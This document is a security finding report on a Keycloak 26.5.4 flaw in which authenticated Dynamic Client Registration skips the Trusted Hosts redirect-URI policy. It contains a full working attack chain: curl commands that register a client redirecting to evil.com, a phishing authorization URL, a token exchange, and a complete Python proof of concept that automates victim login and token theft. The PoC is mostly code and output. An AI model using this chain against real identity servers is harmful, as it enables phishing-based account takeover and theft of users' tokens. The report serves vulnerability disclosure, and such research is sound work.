# Finding #5: DCR Trusted Hosts Bypass --- Auth Code Interception

| Field | Value |
|---|---|
| **Severity** | HIGH (CVSS 8.0) |
| **Affected Version** | Keycloak 26.5.4 (latest stable, confirmed reproducible) |
| **Vulnerability Type** | Broken Access Control / Privilege Escalation via Client Registration Policy Bypass |
| **Affected Components** | DCR Endpoint (`/realms/{realm}/clients-registrations/openid-connect`), Client Registration Policy Engine |
| **Date Validated** | 2026-02-21 |
| **Researcher** | Anggi Pradana |

---

## Summary

Dynamic Client Registration (DCR) "Trusted Hosts" policy only applies to anonymous registrations. Users with the `create-client` realm-management role can register OIDC clients with completely arbitrary `redirect_uris` (e.g., `https://evil.com/steal`) via authenticated DCR, enabling authorization code interception and full token theft for any realm user.

---

## Configuration Context

Default DCR policy configuration. The `Trusted Hosts` policy exists in the `anonymous` subType but is **absent** from the `authenticated` subType. The `create-client` realm-management role is commonly delegated to application developers for self-service client registration.

---

## Detailed Description

Keycloak's DCR endpoint supports two operation modes:

- **`anonymous`** --- No auth required; protected by "Trusted Hosts" policy that validates redirect URIs against an allowlist.
- **`authenticated`** --- Bearer token required; governed by a separate policy set.

The `Trusted Hosts` policy (which validates `redirect_uris` against an allowlist) **only exists in the `anonymous` subType**. The `authenticated` subType has no URI restriction policy whatsoever. This means any user who holds the `create-client` realm-management role can register a fully functional OIDC client with redirect URIs pointing to attacker-controlled infrastructure.

### Policy Analysis

| Policy | `anonymous` subType | `authenticated` subType |
|---|---|---|
| Trusted Hosts (`client-uris-must-match`) | Enforced | **NOT PRESENT** |
| Allowed Protocol Mapper Types | Enforced | Enforced |
| Allowed Client Scopes | Enforced | Enforced |
| Max Clients Limit | Enforced | Not present |
| Consent Required | Enforced | Not present |

### Verified Privilege Boundary

The following table demonstrates the inconsistency between DCR and the admin REST API for the same privilege level:

| Action | Endpoint | Result |
|---|---|---|
| `create-client` role -> DCR with arbitrary redirect_uris | `/realms/{realm}/clients-registrations/openid-connect` | **201 Created (SUCCEEDS)** |
| `create-client` role -> Admin REST API client creation | `/admin/realms/{realm}/clients` | **403 Forbidden (BLOCKED)** |
| Anonymous DCR with `evil.com` redirect | `/realms/{realm}/clients-registrations/openid-connect` | **403 "Trusted Hosts" rejected** |

This confirms a clear policy enforcement gap: authenticated DCR bypasses all URI restrictions that both anonymous DCR and the admin API correctly enforce.

The registered malicious client is:

- **Immediately enabled** --- no admin approval required.
- **Fully functional** --- can initiate authorization code flows.
- **Has a client secret** --- attacker can exchange auth codes for tokens.

---

## Steps to Reproduce

**Prerequisites:**

- Realm: `test`
- User: `testuser` with `create-client` realm-management role assigned
- Victim: `victim / Password123`

### Step 1 --- Assign create-client role (admin setup)

```bash
ADMIN_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

USER_ID="834f6655-5cb3-46ed-b47e-0e50a139dc6c"
RM_CLIENT="66a64a40-b5c6-46eb-a4c9-59199bfe5617"

# Get create-client role
CREATE_ROLE=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/clients/$RM_CLIENT/roles/create-client")

# Assign to testuser
curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "[$CREATE_ROLE]" \
  "http://46.101.162.187:8080/admin/realms/test/users/$USER_ID/role-mappings/clients/$RM_CLIENT"
```

### Step 2 --- Attacker obtains Bearer token

```bash
ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=webapp&grant_type=password&username=testuser&password=Password123&scope=openid" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

### Step 3 --- Register malicious client with evil.com redirect

```bash
REG_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Legitimate Looking App",
    "redirect_uris": ["https://evil.com/steal"],
    "grant_types": ["authorization_code","refresh_token"],
    "response_types": ["code"]
  }')
echo "$REG_RESP" | python3 -m json.tool
```

**Response (201 Created --- NO Trusted Hosts rejection):**

```json
{
  "client_id": "ef73e0e9-503b-49eb-83e2-62792d9ed696",
  "client_secret": "IB92lvyY2jF1tTmjefX7infjL87nnw20",
  "redirect_uris": ["https://evil.com/steal"],
  "grant_types": ["authorization_code", "refresh_token"]
}
```

### Step 4 --- Compare: Anonymous DCR (correctly blocked)

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Content-Type: application/json" \
  -d '{"client_name":"anon-test","redirect_uris":["https://evil.com/steal"]}'
```

```json
{
  "error": "insufficient_scope",
  "error_description": "Policy 'Trusted Hosts' rejected request to client-registration service. Details: Host not trusted."
}
```

### Step 5 --- Craft phishing URL and send to victim

```
http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?
  client_id=ef73e0e9-503b-49eb-83e2-62792d9ed696&
  response_type=code&
  redirect_uri=https://evil.com/steal&
  scope=openid+profile+email
```

The victim sees a legitimate Keycloak login page. There is no visible indication that the client is malicious --- the URL is on the trusted Keycloak domain with real HTTPS.

### Step 6 --- Victim logs in; auth code sent to evil.com

After the victim enters valid credentials:

```
HTTP 302 --> https://evil.com/steal?code=f955ae0d-68e0-1fdf-691a-4ed1d902241a...
```

The authorization code is delivered to the attacker-controlled redirect URI.

### Step 7 --- Attacker exchanges code for victim tokens

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=ef73e0e9-...&client_secret=IB92lvy...&grant_type=authorization_code&code=f955ae0d-...&redirect_uri=https://evil.com/steal"
```

```json
{
  "access_token": "eyJhbG...",
  "refresh_token": "eyJhbG...",
  "scope": "openid profile email",
  "token_type": "Bearer"
}
```

**Validated token claims confirm victim identity:**

```
username: victim
email:    victim@test.com
sub:      41f28100-04a6-4902-9049-0585e5f38dee
```

### Step 8 --- Verify privilege boundary (admin API returns 403)

```bash
curl -s -o /dev/null -w "HTTP %{http_code}" -X POST \
  "http://46.101.162.187:8080/admin/realms/test/clients" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"clientId":"test","redirectUris":["https://evil.com"]}'
# HTTP 403 --- Admin API correctly blocks, but DCR does not
```

---

## Impact

- **Complete auth code interception:** Any user with the `create-client` role can steal tokens of any other realm user, including administrators, by registering a malicious client and phishing them through a legitimate Keycloak login page.
- **No indicators of compromise for victim:** The login page is on the legitimate Keycloak domain with real HTTPS. There are no suspicious UI elements, no browser warnings, and no reason for the victim to suspect anything.
- **Persistent access:** The stolen refresh token provides ongoing access to the victim's account until the victim changes their password or the token is manually revoked.
- **Bypasses all redirect_uri allowlisting:** The `Trusted Hosts` protection that administrators configure is entirely ineffective for authenticated DCR registrations.
- **Scales across all realm users:** A single malicious client registration enables phishing any number of victims in the realm. The attacker only needs to distribute the authorization URL.

---

## Recommendations

1. **Apply `Trusted Hosts` policy to the `authenticated` DCR subType.** The same URI validation that protects anonymous registrations must be enforced for authenticated registrations. This is the primary fix.
2. **Require admin approval for DCR-registered clients.** Add a `client-disabled` policy to the authenticated subType so that newly registered clients require explicit admin activation before they can initiate auth flows.
3. **Add URI domain validation to the `authenticated` policy set.** Restrict `redirect_uris` to pre-approved domains, preventing arbitrary external domains from being registered.
4. **Audit existing DCR-registered clients** for unexpected redirect URIs. Any client registered via DCR with redirect URIs pointing to external domains should be reviewed and potentially disabled.

---

## Proof of Concept --- Full Source

**File:** `pocs/poc_f5_dcr_hijack.py`

**Usage:**

```bash
python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080
```

**Source:**

```python
#!/usr/bin/env python3
"""
Finding #5: DCR Trusted Hosts Bypass — Auth Code Interception
Severity: HIGH (CVSS 8.0)
Target: Keycloak 26.5.4

Demonstrates that authenticated Dynamic Client Registration bypasses
the "Trusted Hosts" policy, allowing arbitrary redirect_uris and
enabling auth code interception + token theft.
"""

import http.client
import json
import base64
import argparse
import sys
import re
import urllib.parse

# ANSI colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def banner():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  Finding #5: DCR Trusted Hosts Bypass — Token Theft          ║
║  Severity: HIGH (CVSS 8.0)                                   ║
║  Keycloak 26.5.4 — Broken Access Control                    ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")

def step(num, msg):
    print(f"{CYAN}[*] Step {num}:{RESET} {msg}")

def success(msg):
    print(f"{GREEN}[+]{RESET} {msg}")

def fail(msg):
    print(f"{RED}[!]{RESET} {msg}")

def info(msg):
    print(f"{YELLOW}[*]{RESET} {msg}")

def http_post(host, port, path, body, headers=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    hdrs = {"Content-Type": "application/x-www-form-urlencoded"}
    if headers:
        hdrs.update(headers)
    conn.request("POST", path, body if isinstance(body, str) else json.dumps(body), hdrs)
    resp = conn.getresponse()
    data = resp.read().decode()
    status = resp.status
    conn.close()
    return status, data

def http_post_json(host, port, path, data, auth_token=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Content-Type": "application/json"}
    if auth_token:
        headers["Authorization"] = f"Bearer {auth_token}"
    conn.request("POST", path, json.dumps(data), headers)
    resp = conn.getresponse()
    body = resp.read().decode()
    status = resp.status
    conn.close()
    return status, body

def http_get_full(host, port, path, cookies=None):
    """GET with full response including headers and set-cookie."""
    conn = http.client.HTTPConnection(host, port, timeout=15)
    hdrs = {}
    if cookies:
        hdrs["Cookie"] = cookies
    conn.request("GET", path, headers=hdrs)
    resp = conn.getresponse()
    body = resp.read().decode()
    resp_headers = {k.lower(): v for k, v in resp.getheaders()}
    all_cookies = [v for k, v in resp.getheaders() if k.lower() == "set-cookie"]
    status = resp.status
    location = resp.getheader("Location", "")
    conn.close()
    return status, body, resp_headers, location, all_cookies

def http_post_form_full(host, port, path, body, cookies=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    hdrs = {"Content-Type": "application/x-www-form-urlencoded"}
    if cookies:
        hdrs["Cookie"] = cookies
    conn.request("POST", path, body, hdrs)
    resp = conn.getresponse()
    resp_body = resp.read().decode()
    location = resp.getheader("Location", "")
    all_cookies = [v for k, v in resp.getheaders() if k.lower() == "set-cookie"]
    status = resp.status
    conn.close()
    return status, resp_body, location, all_cookies

def http_get_json(host, port, path, auth_token):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Authorization": f"Bearer {auth_token}"}
    conn.request("GET", path, headers=headers)
    resp = conn.getresponse()
    body = resp.read().decode()
    conn.close()
    return resp.status, json.loads(body) if body else {}

def get_admin_token(host, port):
    conn = http.client.HTTPConnection(host, port, timeout=10)
    body = "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234"
    conn.request("POST", "/realms/master/protocol/openid-connect/token",
                 body, {"Content-Type": "application/x-www-form-urlencoded"})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode())
    conn.close()
    return data.get("access_token", "")

def parse_cookies(cookie_headers, existing=""):
    """Merge Set-Cookie headers into a cookie string."""
    cookies = {}
    if existing:
        for part in existing.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                cookies[k] = v
    for header in cookie_headers:
        if "=" in header:
            cookie_part = header.split(";")[0]
            k, v = cookie_part.split("=", 1)
            cookies[k] = v
    return "; ".join(f"{k}={v}" for k, v in cookies.items())

def main():
    parser = argparse.ArgumentParser(description="Finding #5: DCR Trusted Hosts Bypass PoC")
    parser.add_argument("--host", default="http://46.101.162.187:8080",
                        help="Keycloak base URL (default: http://46.101.162.187:8080)")
    args = parser.parse_args()

    url = args.host.rstrip("/")
    if "://" in url:
        url = url.split("://", 1)[1]
    if ":" in url:
        host, port = url.rsplit(":", 1)
        port = int(port)
    else:
        host, port = url, 8080

    banner()
    info(f"Target: {host}:{port}")
    realm = "test"
    results = []
    print()

    # ── Setup: Ensure testuser has create-client role ──
    step(0, "SETUP: Ensuring testuser has create-client realm-management role...")
    admin_token = get_admin_token(host, port)
    if not admin_token:
        fail("Failed to get admin token")
        return 1

    # Get user ID
    _, users = http_get_json(host, port,
                              f"/admin/realms/{realm}/users?username=testuser", admin_token)
    user_id = users[0]["id"] if users else None
    if not user_id:
        fail("testuser not found")
        return 1
    success(f"User ID: {user_id}")

    # Get realm-management client UUID
    _, rm_clients = http_get_json(host, port,
                                   f"/admin/realms/{realm}/clients?clientId=realm-management",
                                   admin_token)
    rm_client_id = rm_clients[0]["id"] if rm_clients else None
    if not rm_client_id:
        fail("realm-management client not found")
        return 1

    # Get create-client role
    _, create_role = http_get_json(host, port,
                                    f"/admin/realms/{realm}/clients/{rm_client_id}/roles/create-client",
                                    admin_token)

    # Assign to testuser
    status, body = http_post_json(host, port,
                                   f"/admin/realms/{realm}/users/{user_id}/role-mappings/clients/{rm_client_id}",
                                   [create_role], admin_token)
    if status in (204, 409):
        success("create-client role assigned to testuser")
    else:
        info(f"Role assignment: HTTP {status} (may already be assigned)")
    print()

    # ── Step 1: Attacker obtains Bearer token ──
    step(1, "ATTACKER: Obtaining Bearer token (with create-client role)...")
    body = "client_id=webapp&grant_type=password&username=testuser&password=Password123&scope=openid"
    status, data = http_post(host, port,
                              f"/realms/{realm}/protocol/openid-connect/token", body)
    attacker_token = json.loads(data).get("access_token", "")
    if not attacker_token:
        fail(f"Failed to get attacker token: {data}")
        return 1
    success("Attacker token obtained (testuser — create-client role)")
    print()

    # ── Step 2: Register malicious client via authenticated DCR ──
    step(2, "ATTACKER: Registering malicious OIDC client with evil.com redirect...")
    info("Trusted Hosts policy only applies to anonymous DCR — authenticated bypasses it")
    dcr_data = {
        "client_name": "Legitimate Looking App",
        "redirect_uris": ["https://evil.com/steal"],
        "grant_types": ["authorization_code", "refresh_token"],
        "response_types": ["code"]
    }
    status, body = http_post_json(host, port,
                                   f"/realms/{realm}/clients-registrations/openid-connect",
                                   dcr_data, attacker_token)
    if status == 201:
        reg = json.loads(body)
        mal_client_id = reg.get("client_id", "")
        mal_client_secret = reg.get("client_secret", "")
        mal_redirect = reg.get("redirect_uris", [])
        fail("VULNERABLE — Malicious client registered with NO Trusted Hosts rejection!")
        success(f"Client ID:     {mal_client_id}")
        success(f"Client Secret: {mal_client_secret}")
        success(f"Redirect URIs: {mal_redirect}")
        results.append(("Authenticated DCR bypass", True))
    else:
        success(f"Registration blocked: HTTP {status}")
        info(body[:200])
        results.append(("Authenticated DCR bypass", False))
        mal_client_id = None
    print()

    # ── Step 3: Control test — Anonymous DCR (should be blocked) ──
    step(3, "CONTROL: Anonymous DCR with evil.com redirect (should be blocked)...")
    anon_data = {
        "client_name": "anon-test",
        "redirect_uris": ["https://evil.com/steal"]
    }
    status, body = http_post_json(host, port,
                                   f"/realms/{realm}/clients-registrations/openid-connect",
                                   anon_data)
    if status == 403 or "Trusted Hosts" in body:
        success(f"Anonymous DCR correctly blocked: {body[:150]}")
        results.append(("Anonymous DCR blocked", True))
    else:
        fail(f"Anonymous DCR NOT blocked: HTTP {status}")
        results.append(("Anonymous DCR blocked", False))
    print()

    # ── Step 4: Control test — Admin REST API (should be 403) ──
    step(4, "CONTROL: Admin REST API client creation with attacker token (should be 403)...")
    admin_client_data = {"clientId": "test-admin-api", "redirectUris": ["https://evil.com"]}
    status, body = http_post_json(host, port,
                                   f"/admin/realms/{realm}/clients",
                                   admin_client_data, attacker_token)
    print(f"    Admin API response: HTTP {status}")
    if status == 403:
        success("Admin API correctly returns 403 — privilege boundary confirmed")
        info("DCR allows what Admin API blocks → policy gap!")
    print()

    if not mal_client_id:
        info("Skipping auth code interception (DCR was blocked)")
        print()
    else:
        # ── Step 5: Simulate victim auth flow ──
        step(5, "Simulating victim clicking malicious auth URL...")
        auth_path = (f"/realms/{realm}/protocol/openid-connect/auth?"
                     f"client_id={mal_client_id}&response_type=code&"
                     f"redirect_uri=https://evil.com/steal&scope=openid+profile+email")
        info(f"Auth URL: http://{host}:{port}{auth_path}")

        # Get the login page
        status, body, hdrs, location, set_cookies = http_get_full(host, port, auth_path)
        cookies = parse_cookies(set_cookies)

        # Follow redirects if needed
        while status in (302, 303) and location:
            if location.startswith("http"):
                loc_path = "/" + location.split("://", 1)[1].split("/", 1)[1]
            else:
                loc_path = location
            status, body, hdrs, location, set_cookies = http_get_full(host, port, loc_path, cookies)
            cookies = parse_cookies(set_cookies, cookies)

        # Extract form action URL
        action_match = re.search(r'action="([^"]+)"', body)
        if action_match:
            action_url = action_match.group(1).replace("&amp;", "&")
            success("Got Keycloak login page — victim sees legitimate domain")

            # Submit victim credentials
            step(6, "Victim enters credentials on legitimate Keycloak login page...")
            login_body = "username=victim&password=Password123&credentialId="

            if action_url.startswith("http"):
                action_path = "/" + action_url.split("://", 1)[1].split("/", 1)[1]
            else:
                action_path = action_url

            status, resp_body, location, set_cookies = http_post_form_full(
                host, port, action_path, login_body, cookies)

            if location and "evil.com" in location and "code=" in location:
                code_match = re.search(r'code=([^&]+)', location)
                auth_code = code_match.group(1) if code_match else ""
                fail("Auth code sent to evil.com!")
                print(f"    Redirect: {location[:100]}...")
                print(f"    Auth code: {auth_code[:40]}...")

                # ── Step 7: Exchange code for victim tokens ──
                step(7, "ATTACKER: Exchanging stolen auth code for victim tokens...")
                token_body = (f"client_id={mal_client_id}&client_secret={mal_client_secret}"
                              f"&grant_type=authorization_code&code={auth_code}"
                              f"&redirect_uri=https://evil.com/steal")
                status, token_resp = http_post(host, port,
                                                f"/realms/{realm}/protocol/openid-connect/token",
                                                token_body)
                token_data = json.loads(token_resp)
                if "access_token" in token_data:
                    at = token_data["access_token"]
                    payload_b64 = at.split(".")[1] + "=="
                    claims = json.loads(base64.b64decode(payload_b64))
                    fail("TOKEN THEFT SUCCESSFUL!")
                    print(f"    {RED}Username:      {claims.get('preferred_username')}{RESET}")
                    print(f"    {RED}Email:         {claims.get('email')}{RESET}")
                    print(f"    {RED}User ID:       {claims.get('sub')}{RESET}")
                    print(f"    {RED}Scope:         {token_data.get('scope')}{RESET}")
                    print(f"    {RED}Access Token:  {at[:60]}...{RESET}")
                    print(f"    {RED}Refresh Token: {token_data.get('refresh_token', '')[:60]}...{RESET}")
                    results.append(("Auth code interception", True))
                else:
                    info(f"Token exchange failed: {token_resp[:200]}")
                    results.append(("Auth code interception", False))
            else:
                info(f"Redirect: {location}")
                info("Auth code not captured (victim may need active session)")
                results.append(("Auth code interception", False))
        else:
            info("Could not find login form — auth flow may need browser")
            results.append(("Auth code interception", False))
    print()

    # ── Summary ──
    vuln_count = sum(1 for _, v in results if v)
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  RESULTS SUMMARY                                             ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")
    for name, vuln in results:
        status_str = f"{RED}VULNERABLE{RESET}" if vuln else f"{GREEN}NOT VULNERABLE{RESET}"
        print(f"  {name:35s} {status_str}")

    print(f"""
{YELLOW}Impact:{RESET}
  - Any user with create-client role can steal tokens of ANY realm user
  - Victim sees 100% legitimate Keycloak login page (trusted domain, real HTTPS)
  - Stolen refresh token provides persistent access
  - One malicious client can phish unlimited victims

{YELLOW}Policy Gap:{RESET}
  - Anonymous DCR:      Trusted Hosts ENFORCED (correctly blocks evil.com)
  - Authenticated DCR:  Trusted Hosts NOT PRESENT (allows any redirect_uri)
  - Admin REST API:     Returns 403 (correctly blocks low-privilege users)

{YELLOW}Root Cause:{RESET}
  The "Trusted Hosts" client registration policy only exists in the "anonymous"
  subType. The "authenticated" subType has no URI restriction policy.
""")

    if vuln_count > 0:
        print(f"{RED}{BOLD}[!] {vuln_count}/{len(results)} tests confirm vulnerability{RESET}")
        return 0
    else:
        print(f"{GREEN}[+] All tests passed — not vulnerable{RESET}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
```

---

*This finding was validated on 2026-02-21 against a fresh Keycloak 26.5.4 instance on a private, researcher-controlled VPS. No production systems, real user data, or third-party infrastructure was accessed.*
